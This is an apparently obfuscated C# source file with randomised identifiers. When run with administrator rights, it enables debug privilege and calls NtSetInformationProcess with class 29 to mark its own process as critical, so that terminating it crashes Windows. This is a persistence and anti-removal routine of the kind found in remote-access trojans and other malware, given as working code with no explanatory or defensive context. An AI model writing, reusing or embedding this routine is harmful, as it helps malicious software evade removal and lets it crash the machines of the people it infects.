using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace LSMgrTguKYchoUzfqQ;

public static class FdVIHNDKqeTZ
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr ufBVXdCEIGJ, int IioxwQpsmtXPo, ref int DgNgrLTxUjtj, int SfxezzLsutoNG);

	public static void KxpRaNBYZnX()
	{
		if (ouRyhqprkwf())
		{
			BdtDXVQjFg();
		}
	}

	public static void BdtDXVQjFg()
	{
		int DgNgrLTxUjtj = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref DgNgrLTxUjtj, 4);
	}

	public static bool ouRyhqprkwf()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
